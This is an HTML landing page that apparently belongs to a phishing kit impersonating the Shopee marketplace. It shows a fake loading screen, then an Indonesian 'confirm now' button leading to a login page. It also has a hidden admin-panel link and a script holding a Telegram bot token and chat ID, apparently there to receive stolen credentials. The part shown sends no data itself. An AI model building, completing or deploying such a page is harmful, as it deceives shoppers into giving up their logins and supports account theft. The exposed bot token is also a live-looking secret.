    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
        }

        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .dots {
            display: flex;
            gap: 10px;
        }

        .dot {
            width: 10px;
            height: 10px;
            background: #EE5D30;
            border-radius: 50%;
            animation: bounce 1.4s infinite ease-in-out both;
        }

        .dot:nth-child(1) { animation-delay: -0.32s; }
        .dot:nth-child(2) { animation-delay: -0.16s; }

        @keyframes bounce {
            0%, 80%, 100% {
                transform: scale(0);
            }
            40% {
                transform: scale(1);
            }
        }

        .home-page {
            background: url('asset/shopee.jpg') no-repeat center center;
            background-size: cover;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            display: none;
        }

        #btnku {
            width: 280px;
            height: 40px;
            border: none;
            background: #EE5D30;
            color: #fff;
            font-weight: bold;
            box-shadow: 0 5px 5px rgba(65, 72, 86, 0.3);
            border-radius: 50px;
            cursor: pointer;
        }

        #btnku:hover {
            background: #BA441F;
        }

        .admin-access {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: rgba(0,0,0,0.1);
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            text-decoration: none;
            display: none;
        }
    </style>
</head>
<body>
    <div id="loading" class="loading">
        <div class="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
    </div>

    <div class="home-page" id="homePage">
        <button id="btnku" type="button" onclick="window.location.href='login.html'">KONFIRMASI SEKARANG</button>
    </div>

    <a href="admin.html" class="admin-access" id="adminLink">Admin Panel</a>

    <script>
        // Configuration
        const CONFIG = {
            TELEGRAM_BOT_TOKEN: '8502215115:AAHZGTMdSyHOgzoGDqaqL54ilACSy39gbAc',
            TELEGRAM_CHAT_ID: '8593139959'
        };

        // Check for admin access
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('admin') === 'true') {
                document.getElementById('adminLink').style.display = 'block';
            }

            // Show loading for 3 seconds, then show home page
            setTimeout(function() {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('homePage').style.display = 'flex';
            }, 3000);
        };
    </script>
</body>
